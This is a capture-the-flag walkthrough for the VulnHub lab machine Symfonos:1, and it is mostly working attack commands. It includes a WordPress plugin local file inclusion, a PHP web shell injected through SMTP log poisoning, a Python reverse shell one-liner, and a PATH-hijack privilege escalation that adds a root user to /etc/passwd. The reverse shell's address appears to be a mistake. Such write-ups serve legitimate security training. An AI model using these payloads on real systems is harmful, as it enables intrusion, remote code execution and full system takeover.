



# Symfonos:1 Walkthrough 

**VulnHub Link:** [Symfonos:1](https://www.vulnhub.com/entry/symfonos-1,322/)
**Difficulty:** Easy
**Release Date:** 29 Jun 2019

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.179
```

sudo echo "192.168.100.179    symfonos.local" > /etc/hosts

## 2.Enumeration

```bash
enum4linux 192.168.100.179
```
helios user found

```bash
smbmap -H 192.168.100.179
smbclient //192.168.100.179/anonymous -N
get attention.txt
```

we got 3 password
```
smbclient //192.168.100.179/helios
```
qwerty verified

/h3l105 found

## 3.Web Enumeration

```bash
dirb http://192.168.100.179
```

```bash
wpscan --url 'http://symfonos.local/h3l105/' -e ap,u
searchsploit site editor
searchsploit -m php/webapps/44340.txt
```
http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/helios

```bash
nc -nv 192.168.100.179
MAIL FROM:<hacker>
RCPT TO:helios
data
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo"</pre>";die;}?>
.
```

then ---> http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/helios&cmd=id

we found out commands work

http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/helios&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.179",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

before above command ---> rlwrap nc -nvlp 1234

we got helios shell

## 4.Privilege Escalation

```bash
find / -perm /4000 2>/dev/null
cd /opt
strings statuscheck
echo '#!/bin/sh' > /tmp/curl
echo "chmod 777 /etc/passwd" >> /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
./statuscheck
```

now we can write to passwd file 

in our machine 
```bash
openssl passwd test
```
we obtain hash and design it as --->
```bash
echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2 (password : test)
```

### and BOOOM . WE ARE ROOT..!
